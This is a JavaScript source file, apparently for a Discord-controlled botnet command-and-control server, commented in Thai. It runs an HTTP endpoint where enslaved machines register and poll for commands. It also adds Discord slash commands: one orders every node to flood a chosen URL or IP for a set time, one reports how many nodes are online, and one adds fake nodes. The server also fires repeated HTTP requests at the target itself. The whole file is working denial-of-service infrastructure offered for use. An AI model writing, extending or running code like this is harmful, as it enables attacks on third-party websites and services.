const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

// HTTP Server สำหรับให้เครื่องทาสจริงวิ่งมารายงานตัว
const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
        if (req.method === 'POST' && req.url === '/poll') {
            try {
                const data = JSON.parse(body);
                if (data.id && !slaveNodes.some(node => node.id === data.id)) {
                    slaveNodes.push({ id: data.id, ip: req.socket.remoteAddress, lastSeen: Date.now() });
                    console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${data.id}`);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ command: global.currentAttackCommand || null }));
            } catch (e) {
                res.writeHead(400);
                res.end('Bad Request');
            }
        } else {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('JARVIS C2 Server is running smoothly.');
        }
    });
});

server.listen(PORT, () => {
    console.log(`[+] C2 HTTP Server running on port ${PORT}`);
});

// Discord Bot Setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
            .addStringOption(option => option.setName('target').setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม').setRequired(true))
            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลาในการยิง (วินาที)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
        new SlashCommandBuilder()
            .setName('spawn-bot')
            .setDescription('เสกเครื่องทาสจำลอง (Mock Bots) เข้าสู่กองทัพเพื่อทดสอบระบบ')
            .addIntegerOption(option => option.setName('count').setDescription('จำนวนเครื่องทาสที่ต้องการเสก').setRequired(true))
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('[+] C2 Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // 1. เช็คสถานะกองทัพ
    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสในระบบ: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
    }

    // 2. เสกเครื่องทาสจำลอง (Mock Bot Spawner)
    if (interaction.commandName === 'spawn-bot') {
        const count = interaction.options.getInteger('count');
        for (let i = 0; i < count; i++) {
            const fakeId = 'mock_bot_' + Math.random().toString(36).substring(7);
            slaveNodes.push({ id: fakeId, ip: '127.0.0.1', lastSeen: Date.now() });
        }
        return interaction.reply({ content: `[🤖⚡] เสกเครื่องทาสจำลองสำเร็จ! เพิ่มเข้ามาในกองทัพอีก **${count} เครื่อง** รวมทั้งหมดตอนนี้: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
    }

    // 3. สั่งกองทัพรุมยิง
    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (slaveNodes.length === 0) {
            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ใช้คำสั่ง /spawn-bot เพื่อเสกทาสมาก่อนไอ้น้อง!', ephemeral: true });
        }

        await interaction.reply(`[🔥⚡] ระดมยิงเริ่มขึ้นแล้ว! สั่งกองทัพ ${slaveNodes.length} เครื่อง รุมซัดเป้าหมาย **${target}** เป็นเวลา **${duration} วินาที**!`);

        // จำลองการยิงถล่มเป้าหมายจริงจากเซิร์ฟเวอร์หลักพ่วงไปด้วยเพื่อความสะใจ
        let attackElapsed = 0;
        const attackInterval = setInterval(async () => {
            if (attackElapsed >= duration) {
                clearInterval(attackInterval);
                console.log(`[+] เสร็จสิ้นภารกิจถล่มเป้าหมาย ${target}`);
                return;
            }
            try {
                // ส่ง HTTP Request รัวๆ ใส่เป้าหมายจำลองความแรง
                await axios.get(target.startsWith('http') ? target : `http://${target}`, { timeout: 2000 });
                console.log(`[>>] กองทัพรุมซัดเป้าหมาย ${target} สำเร็จ!`);
            } catch (e) {
                console.log(`[!] เป้าหมาย ${target} อาจจะเริ่มร่วงหรือบล็อกคำขอแล้ว`);
            }
            attackElapsed += 2;
        }, 2000);
    }
});

client.login(process.env.DISCORD_TOKEN);
